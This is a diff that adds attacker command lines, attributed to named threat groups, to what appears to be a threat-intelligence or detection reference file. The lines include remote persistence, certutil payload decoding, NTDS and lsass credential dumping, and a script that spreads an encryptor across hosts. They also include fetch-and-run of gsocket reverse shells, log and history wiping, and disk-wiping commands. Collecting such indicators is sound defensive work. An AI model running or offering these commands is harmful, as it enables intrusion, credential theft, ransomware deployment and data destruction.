@@ -261,7 +261,125 @@ hostname
 \\document-cdn.org\Microsoft Office Word$\WINWORD.exe
 cmd.exe /c start "" reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Office Word" /t REG_SZ /d "\\94.156.8.166\Microsoft Office Word$\WINWORD.exe" /f & start "" msg * Произошла ошибка при открытии данного документа. Файл повреждене и не может быть восстановлен & start "" xcopy "\\79.132.128.47\image.jpg" "\" /Y
 
-cmd.exe" /v /c set "k=%cd%\19_09_2024.msc"&(IF NOT EXIST "!k!" (for /f "tokens=* usebackq"))
+cmd.exe" /v /c set "k=%cd%\19_09_2024.msc"&(IF NOT EXIST "!k!" (for /f "tokens=* usebackq" %g in (`where /R "%userprofile" "19_09_2024.ms"?`) do set "k=%g")>nul 2>&1)&set "f=r"&set "o=%localappdata%"&>nul ce!f!tutil -decode """!k!""" !o!\cleu.t&ren "!o!\cleu.t" cleu.cmD&!o!\cleu
+certutil -decode """
+""" %LOCALAPPDATA%\cleu.t
+powershell -executionpolicy remotesigned -windowstyle hidden -Command "Invoke-Expression $([System.IO.File]::ReadAllText('%LOCALAPPDATA%\cleu.cmD'))"
+HKCU\Software\Microsoft\Office\$xlVersion\Excel\Security\AccessVBOM
+
+# Head Mare
+cmd /c echo %USERDOMAIN%
+
+powershell -c "Expand-Archive -Path $(Get-ChildItem -Path %userprofile% -Recurse -Filter "PC397.zip" | Select-Object -First 1).FullName -DestinationPath C:\ProgramData"; cmd.exe /c start /B 'C:\ProgramData\PC397.zip';!%SystemRoot%
+pcaula.exe -a C:\Windows\System32\splhost.exe
+
+-connect
+-clientIP
+-agentpassword
+-proxy
+-proxyauth
+-useragent
+
+ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
+
+$ipFilePath = "C:\ProgramData\hosts.txt"
+$ipAddresses = Get-Content -Path $ipFilePath
+$sourcePath = "C:\ProgramData\lock.exe"
+$resultFilePath = "C:\ProgramData\Result.txt"
+$errorFilePath = "C:\ProgramData\Error.txt"
+foreach ($ipAddress in $ipAddresses) {
+    $destinationPath = "\\$ipAddress\C$\ProgramData"
+    try {
+        Copy-Item -Path $sourcePath -Destination $destinationPath -Force
+        "$sourcePath copy to $destinationPath" | Out-File -Append -FilePath $resultFilePath
+        Write-Host "$ipAddress--> Encryptor uploaded successfully" -ForegroundColor Green 
+    }
+    catch {
+        "$ipAddress" | Out-File -Append -FilePath $errorFilePath
+        Write-Host "$ipAddress --> Host is down" -ForegroundColor Red 
+    }
+}
+Write-Host "Done!"
+
+# Phoenix Hyena
+['SHELL=/bin/bash', 'HISTFILE=/dev/null']
+
+curl -fsSL https://gsocket.io/x
+curl -fsSL --connect-timeout 7 -m900 --retry 3 https://cdn.gsocket.io/bin/gs-netcat_mini-linux-x86_64 --output /dev/shm/.gs-0/gs-netcat_mini-linux-x86_64
+mv /dev/shm/.gs-0/gs-netcat_mini-linux-x86_64 /dev/shm/.gs-0/gs-netcat
+chmod 700 /usr/bin/defunct
+cp /dev/shm/.gs-0/gs-netcat /usr/bin/defunct
+rm -f /dev/shm/.gs-0/gs-netcat
+touch /lib/systemd/system/defunct.service
+chmod 644 /lib/systemd/system/defunct.service
+touch /lib/systemd/system/defunct.dat
+rm -rf /dev/shm/.gs-0/*
+rmdir /dev/shm/.gs-0
+systemctl enable defunct
+
+[Unit]
+Description=D-Bus System Connection Bus
+After=network.target
+[Service]
+Type=simple
+Restart=always
+RestartSec=10
+WorkingDirectory=/root
+ExecStart=/bin/bash -c "GS_ARGS='-k 
+/gs-dbus.dat -ilq' exec -a '
+
+/usr/bin/pkill -0 -U105 gs-dbus 2>/dev/null || SHELL=/bin/bash TERM=xterm-256color GS_ARGS="-k 
+/gs-dbus.dat -liqD" /bin/bash -c "exec -a '
+/gs-dbus'" 2>/dev/null
+
+wevutil.exe cl Security
+
+# KibOrg
+--set-password
+
+# Twelve
+powershell.exe -ex bypass -f C:\Users\Public\gpo.ps1
+powershell -command wevutil el | Foreach-Object {Write-Host Clearing $_; wevutil cl $_}
+
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+
+# UHG
+unset HISTFILE; unset SSH_CONNECTION; unset SSH_CLIENT ; unset LC_TERMINAL; unset LC_TERMINAL_VERSION
+history -c
+
+touch -t 202006231433.23 Data.php
+
+bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+curl -fsSL --connect-timeout 7 -m30 --retry 3 https://gsocket.io/bin/gs-netcat_x86-64-alpine.tar.gz --output /dev/shm/.gs-0/gs-netcat_x86-64-alpine.tar.gz
+tar xfz gs-netcat_x86-64-alpine.tar.gz
+cp /dev/shm/.gs-0/gs-netcat /usr/bin/gs-netcat
+
+snap advise-snap --format=json --command mysqldump
+nmap -p 22
+nmap -p 3306
+wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php -O Data.php
+adminer
+
+# BO Team
+system reset-configuration
+reset saved-configuration
+schedule reboot delay 60
+dd bs=1M if=/dev/zero of=/dev/mmcblk0
+sleep 600 && rm -rf /* &
+
+# IT Army of Ukraine
+pro.exe -accepteula -ma lsass.exe lsass.dmp
+psexec64.exe -i
+
+@echo off
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+attrib -s -h %userprofile%\documents\Default.rdp
+del %userprofile%\documents\Default.rdp
+del /f /s /q /a %AppData%\Microsoft\Windows\Recent\AutomaticDestinations
 
 # Do not remove the line
 
